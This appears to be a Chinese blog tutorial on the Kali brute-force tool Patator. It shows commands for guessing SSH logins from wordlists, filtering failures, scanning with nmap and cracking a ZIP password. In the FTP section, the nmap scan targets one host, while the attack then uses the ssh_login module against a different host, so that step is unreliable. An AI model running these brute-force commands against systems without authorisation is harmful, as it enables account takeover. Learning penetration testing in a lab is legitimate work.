> 在平时的学习中，我们需要用到暴力破解。在kali中有很多优秀的暴力破解工具。如`Hydra`、`Medusa`、`Ncrack`、`Metasploit模块`、`nmap`插件等等。无论是哪种工具，都有自身的优点和缺点。本文将为你介绍一种全新的暴力破解工具`Patator`。

`Patator`预装在kali中，我们可以通过输入这个工具的名称来启动它。`help` 命令将显示此工具中可用的所有模块。

### 🚧帮助命令

```
patator
 -h
```

![](../Images/3e5f9928a48cab3e2e5e5540b3b4c56d.png)

### ⛳特定模块的使用

假设我们的服务器开启了`22`端口，意味着服务器存在ssh服务。所以我们将使用`SSH` 模块通过暴力攻击获取有效的用户名和密码来登录服务。我们可以通过以下命令检查任何模块的具体使用情况。

```
patator
 <模块名称>patator ssh
_login
```

![](../Images/c2bf8510452ba0f7de05b63c9ce1b573.png)

### 👣牛刀小试

这里我们尝试暴力破解ssh服务器，使用语法为`patator <模块> host= user=FILE0 password=FILE1 0=<用户名列表> 1=<密码列表>`

```
patator ssh_login host=192.168.50.1 user=FILE0 password=FILE1 0=/root/username.txt 1=/root/password
.txt
```

![](../Images/a1405a6284cb3b28daab9bb852bd467e.png)

同样，如果不想打印错误的组合，我们可以简单的过滤下`-x ignore:mesg='Authentication failed.'`

**示例**

```
patator ssh_login host=192.168.50.1 user=FILE0 password=FILE1 0=/root/username.txt 1=/root/password.txt -x ignore:mesg='Authentication failed.'

```

![](../Images/143ef2188a39ea197500610a7dc299ba.png)

### 🍭暴力破解特定端口

假设`FTP` 服务通常在端口 `21` 上运行，但由于安全级别的提高，管理员更改了端口号。

```
nmap -T4 -A 192.168.50.66

```

![](../Images/2f12a8633aa5f02f7da9b84f53b25620.png)

这时，我们需要指定端口`port=2121`

```
patator ssh_login host=192.168.50.1 port=2121 user=FILE0 password=FILE1 0=/root/username.txt 1=/root/password
.txt
```

![](../Images/8843cc9bc0d9dee762d56a80c8f3817b.png)

### 🍄破解ZIP密码

```
patator unzip_pass zipfile=/root/kali.zip password=FILE0 0=/root/zi.txt -x ignore:code!=0

```

![](../Images/dddc29d04e0390fe017e0369b1d0c5fa.png)

### 🙈总结

`Patator`包含的破解类型比较全，没有过多的配置。使用比较简单。但是无论是哪个基于枚举破解的程序，他都依赖于强大的字典文件。因而成功率也只能靠运气了。
